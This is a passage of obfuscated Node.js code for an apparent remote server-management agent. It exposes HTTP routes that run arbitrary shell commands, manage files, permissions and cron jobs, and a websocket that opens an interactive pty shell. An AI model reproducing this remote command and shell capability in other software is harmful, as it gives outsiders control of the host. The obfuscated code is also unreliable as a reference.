                a[bn(0x36a)](this['websocket'][bn(0x17f)], this[bn(0x254)]['OPEN']) && this[bn(0x254)][bn(0x3e5)](0x3e8, a[bn(0x279)]);
            } catch (c) {
            } finally {
                this[bn(0x254)] = null;
            }
    }
    [a0S(0x318)](a) {
        const bo = a0S, b = {
                'sigxp': function (c, d) {
                    return c === d;
                },
                'HQLGu': function (c, d) {
                    return c > d;
                },
                'mOlyB': bo(0x2aa)
            };
        if (b['sigxp'](this[bo(0x158)], bo(0x28d))) {
            if (b['HQLGu'](this[bo(0x1c4)]['length'], 0x0)) {
                const c = this[bo(0x1c4)][bo(0x1fa)]();
                c(a);
            } else
                this[bo(0x37e)][bo(0x2d0)](a);
        } else
            this[bo(0x158)] === b['mOlyB'] && this[bo(0x388)](a);
    }
    async [a0S(0x35f)]() {
        const bp = a0S, a = {
                'YNmiM': function (b, c) {
                    return b > c;
                }
            };
        if (a['YNmiM'](this[bp(0x37e)][bp(0x3ba)], 0x0))
            return this[bp(0x37e)][bp(0x1fa)]();
        return new Promise(b => {
            this['msgResolvers']['push'](b);
        });
    }
    async [a0S(0x301)](a) {
        const bq = a0S, b = {
                'xRaQI': bq(0x3cc),
                'wnNeU': '三次握手交互后仍未进入\x20Established\x20状态',
                'HqiBU': function (c, d) {
                    return c(d);
                },
                'ZWiXm': bq(0x2e3),
                'MMRlR': function (c, d) {
                    return c(d);
                },
                'gunQl': bq(0x37f)
            };
        a(b[bq(0x2a6)]);
        try {
            await this[bq(0x3a6)][bq(0x1e0)]();
            const c = await this[bq(0x35f)](), d = this[bq(0x3a6)][bq(0x1b7)](c);
            d && d[bq(0x3ba)] > 0x0 && this[bq(0x254)]['send'](d);
            const f = await this['_receiveWsBytes']();
            this[bq(0x3a6)][bq(0x1b7)](f);
            if (!this['cipher'][bq(0x326)])
                throw new Error(b[bq(0x178)]);
            b['HqiBU'](a, b[bq(0x189)]);
        } catch (g) {
            b[bq(0x1b6)](a, bq(0x22d) + g[bq(0x35a)]);
            throw new Error(b['gunQl']);
        }
    }
    [a0S(0x371)]() {
        const br = a0S, a = {
                'lwhCo': br(0x3ad),
                'iSwzy': br(0x1ab),
                'EOWHK': '/bin/sh'
            }, b = process.env.SHELL;
        if (b && a0h[br(0x1ed)](b))
            return b;
        const c = [
            a[br(0x317)],
            br(0x238),
            a[br(0x420)],
            a[br(0x358)]
        ];
        for (const d of c) {
            if (a0h[br(0x1ed)](d))
                return d;
        }
        return a[br(0x358)];
    }
    async ['startSession'](a, b, c) {
        const bs = a0S, d = {
                'hSvpw': 'message',
                'cBSel': function (g, h) {
                    return g(h);
                }
            };
        this[bs(0x254)] = a, this[bs(0x425)] = b;
        const f = g => a0t[bs(0x38d)](bs(0x3ed) + b + ']\x20' + g);
        this[bs(0x376)] = !c, f(this['useNoise'] ? bs(0x27c) : bs(0x42f)), a['on'](d[bs(0x1a7)], g => this[bs(0x318)](g));
        try {
            this[bs(0x376)] && await this['_doNoiseHandshake'](f), await this[bs(0x21c)](f);
        } catch (g) {
            d[bs(0x17b)](f, '❌\x20终端会话异常:\x20' + g[bs(0x35a)]), await this[bs(0x320)]();
        }
    }
    async ['_runTerminal'](a) {
        const bt = a0S, b = {
                'cNfEv': function (f, g) {
                    return f === g;
                },
                'cSKpN': function (f, g) {
                    return f(g);
                },
                'oNioP': bt(0x38c),
                'dQPtH': 'xterm-256color',
                'cSrOj': function (f, g) {
                    return f(g);
                },
                'oXlAM': bt(0x2aa),
                'HFnJC': function (f, g) {
                    return f > g;
                },
                'HhzQd': bt(0x3e5)
            }, c = this[bt(0x371)]();
        b[bt(0x3fb)](a, bt(0x1ad) + c);
        const d = Object[bt(0x1d3)]({}, process.env);
        delete d[bt(0x386)], d[bt(0x1e7)] = b[bt(0x345)];
        if (!d[bt(0x30b)])
            d[bt(0x30b)] = bt(0x341);
        try {
            this[bt(0x3b4)] = a0s[bt(0x410)](c, [], {
                'name': b[bt(0x345)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': process.env.HOME || process['cwd'](),
                'env': d
            }), b['cSrOj'](a, bt(0x412) + (this[bt(0x3b4)][bt(0x1be)] || 'unknown') + ')'), this[bt(0x158)] = b['oXlAM'];
            while (b['HFnJC'](this[bt(0x37e)][bt(0x3ba)], 0x0)) {
                const f = this[bt(0x37e)][bt(0x1fa)]();
                this['_processTerminalMessage'](f);
            }
            this[bt(0x3b4)][bt(0x260)](g => {
                const bu = bt;
                try {
                    let h = Buffer[bu(0x1ec)](g, bu(0x313));
                    this['useNoise'] && this[bu(0x3a6)] && this[bu(0x3a6)][bu(0x326)] && (h = this[bu(0x3a6)][bu(0x282)](h)), b[bu(0x2dc)](this[bu(0x254)][bu(0x17f)], 0x1) && this[bu(0x254)][bu(0x429)](h);
                } catch (i) {
                }
            }), this[bt(0x3b4)][bt(0x14a)](({
                exitCode: g,
                signal: h
            }) => {
                const bv = bt;
                b[bv(0x3fb)](a, bv(0x37c) + g + bv(0x3ab) + h + ')'), this['cleanup']();
            }), this['websocket']['on'](b['HhzQd'], () => {
                const bw = bt;
                b['cSKpN'](a, b[bw(0x281)]), this[bw(0x320)]();
            });
        } catch (g) {
            a('💥\x20启动终端失败:\x20' + g[bt(0x35a)]), await this[bt(0x320)]();
            throw g;
        }
    }
    ['_processTerminalMessage'](a) {
        const bx = a0S, b = {
                'yqkWD': function (c, d) {
                    return c === d;
                },
                'HQnpk': bx(0x43a),
                'KFIzi': function (c, d) {
                    return c === d;
                },
                'tPpoL': bx(0x152),
                'KINLM': bx(0x2c4),
                'zcnNg': function (c, d) {
                    return c !== d;
                },
                'nUIRr': bx(0x209),
                'ZnTyT': bx(0x313)
            };
        if (!this['ptyProcess'])
            return;
        try {
            const c = Buffer[bx(0x1ec)](a);
            let d;
            this[bx(0x376)] ? d = this[bx(0x3a6)][bx(0x39f)](c) : d = c;
            let f = ![], g = d['toString']('utf-8');
            if (g[bx(0x273)]()[bx(0x1f5)]('{'))
                try {
                    const h = JSON[bx(0x430)](g);
                    f = !![];
                    if (b['yqkWD'](h[bx(0x2c1)], b['HQnpk'])) {
                        let i = Buffer[bx(0x1ec)](JSON[bx(0x2b4)]({ 'type': 'heartbeat' }));
                        if (this['useNoise'])
                            i = this[bx(0x3a6)]['encrypt'](i);
                        this['websocket']['send'](i);
                        return;
                    }
                    if (b[bx(0x2e8)](h[bx(0x2c1)], b[bx(0x405)])) {
                        this[bx(0x3b4)][bx(0x152)](h[bx(0x17e)] || 0x50, h[bx(0x3c3)] || 0x18);
                        return;
                    }
                    if (h[bx(0x2c1)] === b['KINLM'] && b['zcnNg'](h[bx(0x1d5)], undefined)) {
                        let j = b[bx(0x31c)](h[bx(0x34e)], bx(0x209)) ? Buffer[bx(0x1ec)](h[bx(0x1d5)], b[bx(0x36d)])['toString'](b[bx(0x280)]) : h[bx(0x1d5)];
                        this['ptyProcess']['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this['ptyProcess'][bx(0x384)](d[bx(0x3f4)](b[bx(0x280)]));
        } catch (l) {
            a0t[bx(0x38d)](bx(0x3ed) + this[bx(0x425)] + ']\x20⚠️\x20指令处理异常:\x20' + l[bx(0x35a)]);
            if (this[bx(0x376)])
                this[bx(0x320)]();
        }
    }
}
async function a0P() {
    const by = a0S, a = {
            'feyOE': by(0x40c),
            'HgYMo': by(0x1c3),
            'AiZmK': 'Access-Control-Expose-Headers',
            'GvokV': by(0x303),
            'WEoke': function (b, c) {
                return b === c;
            },
            'gjoqa': function (b) {
                return b();
            },
            'xgkVt': function (b, c) {
                return b === c;
            },
            'LtMit': by(0x338),
            'prqwZ': by(0x3b8),
            'Wjxwq': function (b, c) {
                return b === c;
            },
            'CpJPL': by(0x3c8),
            'xBOcS': by(0x2e6),
            'SUgNr': by(0x209),
            'YhamU': by(0x149),
            'VsKSY': by(0x391),
            'mSEFk': by(0x2ce),
            'iwGUP': function (b, c, d) {
                return b(c, d);
            },
            'cXLHN': function (b, c, d) {
                return b(c, d);
            },
            'IQxJj': by(0x278),
            'CUHpf': by(0x19b),
            'MWIjw': by(0x157),
            'LBmJz': by(0x3d6),
            'mUUKh': by(0x1c7),
            'segrt': 'Config\x20validated',
            'XrQfZ': by(0x382),
            'PaCwp': by(0x1a6),
            'ciCoo': by(0x36e),
            'UvPzQ': function (b) {
                return b();
            },
            'CBbAX': function (b, c) {
                return b(c);
            },
            'WDEwe': 'Middleware\x20applied,\x20setting\x20up\x20routes...',
            'JwQCC': '/api/baseinfo',
            'oWOWl': by(0x1c5),
            'spHJC': by(0x2a4),
            'NHhwO': by(0x1bb),
            'RzqLm': by(0x15d),
            'pKdJL': by(0x198),
            'YPemI': by(0x2f4),
            'BKEKI': by(0x242),
            'tJmqe': by(0x3a3),
            'vISEU': by(0x319),
            'WypNU': by(0x407),
            'PZLNk': by(0x42e),
            'PLPVy': by(0x2d5),
            'BSpcp': by(0x2ad),
            'QDErg': by(0x258),
            'tNMuf': by(0x400),
            'fcHtr': by(0x347),
            'TRzEW': '/api/ws/*',
            'RRZog': by(0x395),
            'nHVJj': by(0x3e7),
            'YYCGI': by(0x366),
            'yPLbK': by(0x323)
        };
    try {
        a0t['debug'](a[by(0x14b)]), a0t['debug'](a[by(0x2e9)]), a0D[by(0x2fa)](), a0t[by(0x2fc)](a[by(0x41b)]), a0t['debug'](by(0x3f6));
        const b = new a0E(a0D['ECDSA_PUBLIC_KEY_PEM'], a0D['ECIES_PUBLIC_KEY_PEM']);
        a0t[by(0x2fc)](a[by(0x3de)]), a0t['debug'](a[by(0x1b4)]);
        const c = new a0G();
        a0t[by(0x2fc)](a[by(0x2a2)]), a0t[by(0x2fc)](by(0x353));
        const d = a['UvPzQ'](a0f);
        a[by(0x26b)](a0q, d), a0t['debug']('Express\x20app\x20created\x20and\x20expressWs\x20applied'), d[by(0x379)]((g, h, i) => {
            const bz = by;
            h[bz(0x3da)](a['feyOE'], '*'), h[bz(0x3da)](a[bz(0x1b9)], bz(0x42a)), h[bz(0x3da)](bz(0x3e3), bz(0x169)), h[bz(0x3da)](a['AiZmK'], a[bz(0x3c9)]);
            if (a['WEoke'](g[bz(0x263)], bz(0x1e3)))
                return h['status'](0xc8)['end']();
            a[bz(0x18a)](i);
        }), d[by(0x379)](a0f[by(0x1e2)]({
            'type': () => !![],
            'limit': by(0x2b0)
        })), d[by(0x379)](a0f[by(0x17d)]({ 'extended': !![] })), d[by(0x379)](a[by(0x26b)](a0F, b)), a0t[by(0x2fc)](a[by(0x219)]), d[by(0x269)](a[by(0x1ca)], async (g, h) => {
            const bA = by;
            try {
                const i = await c['getBasicInfo']();
                a[bA(0x2d1)](g[bA(0x370)], ![]) && (i[bA(0x3d2)] = null, i[bA(0x176)] = null), h['json'](i);
            } catch (j) {
                h[bA(0x160)](0x1f4)[bA(0x2c0)]({
                    'status': bA(0x338),
                    'message': j[bA(0x35a)]
                });
            }
        }), d[by(0x269)](by(0x399), async (g, h) => {
            const bB = by;
            try {
                const i = await c['getRealtimeInfo']();
                h[bB(0x2c0)](i);
            } catch (j) {
                h[bB(0x160)](0x1f4)['json']({
                    'status': a[bB(0x154)],
                    'message': j[bB(0x35a)]
                });
            }
        }), d[by(0x1fc)](a[by(0x164)], async (g, h) => {
            const bC = by;
            try {
                let i = null;
                if (a['WEoke'](typeof g[bC(0x20e)], a[bC(0x3f8)]))
                    i = g[bC(0x20e)][bC(0x273)]();
                else
                    g[bC(0x20e)] && a['Wjxwq'](typeof g[bC(0x20e)], a['CpJPL']) && (i = g[bC(0x20e)]['cmd'] || '');
                if (!i)
                    return h['status'](0x190)[bC(0x2c0)]({
                        'status': a[bC(0x154)],
                        'message': a['xBOcS']
                    });
                const j = await a0H[bC(0x423)](i, {
                    'cwd': g['body'][bC(0x3d3)],
                    'env': g[bC(0x20e)]['env'],
                    'timeout': a0D[bC(0x167)]
                });
                h[bC(0x2c0)](j);
            } catch (k) {
                h['status'](0x1f4)[bC(0x2c0)]({
                    'status': 'error',
                    'message': k[bC(0x35a)]
                });
            }
        }), d[by(0x1fc)](a[by(0x1af)], async (g, h) => {
            const bD = by;
            try {
                const i = await a0I[bD(0x402)](g['body'][bD(0x1c2)], g[bD(0x20e)][bD(0x30d)]);
                h['json']({
                    'status': 'ok',
                    'count': i[bD(0x3ba)],
                    'files': i
                });
            } catch (j) {
                h['status'](0x1f4)['json']({
                    'status': 'error',
                    'message': j[bD(0x35a)]
                });
            }
        }), d[by(0x1fc)](a[by(0x2be)], async (g, h) => {
            const bE = by;
            try {
                const i = await a0I['getFilePermissions'](g[bE(0x20e)][bE(0x2ae)] || []);
                h[bE(0x2c0)]({
                    'status': 'ok',
                    'files': i
                });
            } catch (j) {
                h[bE(0x160)](0x1f4)[bE(0x2c0)]({
                    'status': a[bE(0x154)],
                    'message': j[bE(0x35a)]
                });
            }
        }), d[by(0x3b3)](a[by(0x2be)], async (g, h) => {
            const bF = by;
            try {
                const i = g[bF(0x20e)]['permissions'] || {}, j = g['body'][bF(0x30d)] === !![], k = await a0I['setFilePermissions'](i, j);
                h[bF(0x2c0)](k);
            } catch (l) {
                h['status'](0x1f4)[bF(0x2c0)]({
                    'status': a[bF(0x154)],
                    'message': l[bF(0x35a)]
                });
            }
        }), d[by(0x1fc)](a[by(0x33b)], async (g, h) => {
            const bG = by;
            try {
                const i = await a0I[bG(0x1ee)](g[bG(0x20e)][bG(0x1c2)]);
                h['json'](i);
            } catch (j) {
                h[bG(0x160)](0x1f4)[bG(0x2c0)]({
                    'status': a[bG(0x154)],
                    'message': j['message']
                });
            }
        }), d['post'](by(0x2f4), async (g, h) => {
            const bH = by;
            try {
                const i = await a0I['uploadFile'](g[bH(0x20e)]['path'], g[bH(0x20e)][bH(0x3ff)], g[bH(0x20e)]['content'], g['body'][bH(0x3ca)], g[bH(0x20e)][bH(0x32f)]);
                h[bH(0x2c0)](i);
            } catch (j) {
                h[bH(0x160)](0x1f4)[bH(0x2c0)]({
                    'status': a['LtMit'],
                    'message': j[bH(0x35a)]
                });
            }
        }), d['post'](a[by(0x251)], async (g, h) => {
            const bI = by;
            try {
                const i = await a0I[bI(0x314)](g[bI(0x20e)][bI(0x1c2)]), j = Buffer[bI(0x1ec)](i['content'], a[bI(0x1fb)]);
                return h[bI(0x3b7)](a[bI(0x40b)], i[bI(0x329)][bI(0x3f4)]()), h[bI(0x3b7)](a[bI(0x14e)], i['path']), h['set'](bI(0x283), a[bI(0x1d1)]), h[bI(0x429)](j);
            } catch (k) {
                h[bI(0x160)](0x1f4)['json']({
                    'status': a[bI(0x154)],
                    'message': k[bI(0x35a)]
                });
            }
        }), d[by(0x202)]('/api/file', async (g, h) => {
            const bJ = by;
            try {
                let i = g[bJ(0x20e)]['paths'];
                if (!i || !Array[bJ(0x1e5)](i)) {
                    i = [];
                    if (g[bJ(0x20e)]['path'])
                        i[bJ(0x2d0)](g[bJ(0x20e)]['path']);
                    if (g['body'][bJ(0x41e)])
                        i[bJ(0x2d0)](g[bJ(0x20e)][bJ(0x41e)]);
                }
                const j = await a0I[bJ(0x324)](i);
                h['json']({
                    'status': 'ok',
                    'results': j
                });
            } catch (k) {
                h[bJ(0x160)](0x1f4)['json']({
                    'status': a[bJ(0x154)],
                    'message': k['message']
                });
            }
        }), d[by(0x3b3)](a[by(0x3e2)], async (g, h) => {
            const bK = by;
            try {
                const i = await a0I['moveFiles'](g[bK(0x20e)][bK(0x409)] || g[bK(0x20e)]);
                h['json']({
                    'status': 'ok',
                    'total': i[bK(0x3ba)],
                    'success': i['filter'](j => j[bK(0x160)] === 'ok')['length'],
                    'results': i
                });
            } catch (j) {
                h[bK(0x160)](0x1f4)[bK(0x2c0)]({
                    'status': a[bK(0x154)],
                    'message': j[bK(0x35a)]
                });
            }
        }), d['post'](a[by(0x2ec)], async (g, h) => {
            const bL = by;
            try {
                const i = await a0I[bL(0x1ea)](g[bL(0x20e)]);
                h[bL(0x2c0)]({
                    'status': 'ok',
                    'total': i[bL(0x3ba)],
                    'success': i[bL(0x2ef)](j => j['status'] === 'ok')[bL(0x3ba)],
                    'results': i
                });
            } catch (j) {
                h['status'](0x1f4)[bL(0x2c0)]({
                    'status': a[bL(0x154)],
                    'message': j['message']
                });
            }
        }), d['post'](a['tJmqe'], async (g, h) => {
            const bM = by;
            try {
                const i = await a0I[bM(0x2a8)](g['body'][bM(0x1c2)]);
                h['json'](i);
            } catch (j) {
                h[bM(0x160)](0x1f4)[bM(0x2c0)]({
                    'status': a[bM(0x154)],
                    'message': j[bM(0x35a)]
                });
            }
        }), d['get'](a['vISEU'], (g, h) => {
            const bN = by;
            h['json'](a0J[bN(0x2f1)]());
        }), d[by(0x1fc)](a[by(0x24f)], async (g, h) => {
            const bO = by;
            try {
                const i = await a0J[bO(0x2e0)](g[bO(0x20e)]);
                h[bO(0x2c0)](i);
            } catch (j) {
                h['status'](0x1f4)[bO(0x2c0)]({
                    'status': a[bO(0x154)],
                    'message': j[bO(0x35a)]
                });
            }
        }), d[by(0x269)](a['WypNU'], (g, h) => {
            const bP = by;
            h[bP(0x2c0)](a0J['getCronTasks']());
        }), d[by(0x1fc)](a['WypNU'], (g, h) => {
            const bQ = by;
            try {
                const i = a0J['setCronTasks'](g[bQ(0x20e)]);
                h[bQ(0x2c0)](i);
            } catch (j) {
                h[bQ(0x160)](0x1f4)[bQ(0x2c0)]({
                    'status': a[bQ(0x154)],
                    'message': j[bQ(0x35a)]
                });
            }
        }), d[by(0x269)](a[by(0x3b2)], (g, h) => {
            const bR = by;
            h[bR(0x2c0)](a0J[bR(0x2fd)]());
        }), d[by(0x269)](a[by(0x1ef)], (g, h) => {
            const bS = by;
            let i = a['iwGUP'](parseInt, g['query'][bS(0x2ee)], 0xa) || 0x32;
            i = Math[bS(0x29a)](Math[bS(0x253)](i, 0x1), 0x64), h[bS(0x2c0)](a0J[bS(0x2f3)](i));
        }), d[by(0x269)](a[by(0x1a8)], (g, h) => {
            const bT = by;
            let i = a[bT(0x37d)](parseInt, g['query']['limit'], 0xa) || 0x32;
            i = Math[bT(0x29a)](Math['max'](i, 0x1), 0x64), h[bT(0x2c0)](a0J[bT(0x2c9)](i));
        }), d[by(0x202)](a['PLPVy'], (g, h) => {
            const bU = by;
            h[bU(0x2c0)](a0J['clearOnetimeLogs']());
        }), d[by(0x202)](a[by(0x1a8)], (g, h) => {
            const bV = by;
            h['json'](a0J[bV(0x3ac)]());
        }), d['get'](a[by(0x350)], (g, h) => {
            const bW = by;
            h[bW(0x2c0)](a0J[bW(0x2cb)]());
        }), d['post'](a[by(0x293)], async (g, h) => {
            const bX = by;
            try {
                const i = await a0J[bX(0x2f9)]();
                h[bX(0x2c0)](i);
            } catch (j) {
                h[bX(0x160)](0x1f4)[bX(0x2c0)]({
                    'status': bX(0x338),
                    'message': j[bX(0x35a)]
                });
            }
        }), a0t[by(0x2fc)](a[by(0x352)]), d['ws'](a[by(0x38e)], async (g, h) => {
            const bY = by, i = h['params'][0x0];
            a0t['debug'](bY(0x233) + h[bY(0x37a)]), a0t[bY(0x2fc)](bY(0x1d2) + i);
            const j = h['query'][bY(0x2f7)], k = h[bY(0x2ba)][bY(0x3f1)];
            a0t[bY(0x2fc)](bY(0x1f4) + j);
            if (!j) {
                a0t[bY(0x2fc)]('Closing\x20connection\x20due\x20to\x20missing\x20request_id'), g[bY(0x3e5)](0x3f0, a[bY(0x401)]);
                return;
            }
            const l = new a0O();
            await l[bY(0x20d)](g, j, k);
        }), a0t['debug'](a['RRZog']), a0t['debug'](a[by(0x1e4)]);
        const f = d['listen'](a0D['PORT'], a0D['HOST'], () => {
            const bZ = by;
            a0t['debug'](bZ(0x427) + a0D['AGENT_VERSION'] + bZ(0x34c) + a0D['HOST'] + ':' + a0D[bZ(0x385)]), a0t['debug'](a['CUHpf']);
        });
        process['on'](by(0x1eb), () => {
            const c0 = by;
            a0t[c0(0x2fc)](a['MWIjw']), f[c0(0x3e5)](), process[c0(0x3fa)](0x0);
        }), a0t['debug'](a[by(0x163)]);
    } catch (g) {
        a0t[by(0x338)](a['yPLbK'], g), process[by(0x3fa)](0x1);
    }
}
(require[a0S(0x349)] === module || require['main']?.[a0S(0x3ff)]?.['includes'](a0S(0x2d6))) && a0P()[a0S(0x284)](a0t[a0S(0x338)]);
module[a0S(0x321)] = {
    'Config': a0D,
    'CryptoManager': a0E,
    'SystemInfoCollector': a0G,
    'CommandExecutor': a0H,
    'FileManager': a0I,
    'TaskManager': a0J
};